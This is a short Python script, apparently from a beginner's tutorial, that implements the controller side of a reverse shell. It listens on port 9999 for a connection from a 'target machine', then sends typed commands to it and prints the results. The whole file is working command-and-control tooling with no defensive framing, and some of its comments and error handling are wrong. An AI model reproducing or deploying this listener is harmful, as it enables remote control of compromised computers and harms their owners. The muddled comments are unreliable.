# to have socket , two computer can communicate
import socket
# to run system command
import sys

# create socket
def socketCreate():
    try:
        global host # the ip address of where to connect to  - my ip address actually
        global port # ip address of the client
        global s
        host = ''
        port = 9999
        s = socket.socket() # the socket for conversation between the server and target machine
    except socket.error as msg:
        print("socket creation error " + str(msg))

# bind socket to port and wait for connection from the client
def socket_bind():
    try:
        global host # the ip address of where to connect to  - my ip address actually
        global port # ip address of the client
        global s
        print("binding socket to port " + str(port))
        s.bind((host,port))
        s.listen(5) # 5 is the number of bad connections it will take before refusing taking more
    except socket.error as msg:
        print('socket binding error ' + msg + '\n retrying...')
        socket_bind()

#accept connections (create connection with client - socket must be listening)
def socket_accept():
    connect ,address = s.accept()
    print("connection has been established | IP " + address[0] + " port " + str(address[1]))
    send_commands(connect)
    connect.close()

# send commands
def send_commands(connect):
    while True:
        command = input() # input = like scanner
        if command == "quit":
            connect.close()
            s.close()
            sys.exit()
        # encode is because what we type in cmd is stored as bytes and not string
        if len(str.encode(command)) > 0:  #  need to send it as bytes
            connect.send(str.encode(command))
            # 1024 = buffer size , utf-8 = basic character encoding for a string , means turning our data to normal string
            client_response = str(connect.recv(1024) , "utf-8") # now we get the response as bytes and need to convert it to string
            print(client_response , end="")


def main():
    socketCreate()
    socket_bind()
    socket_accept()

main()









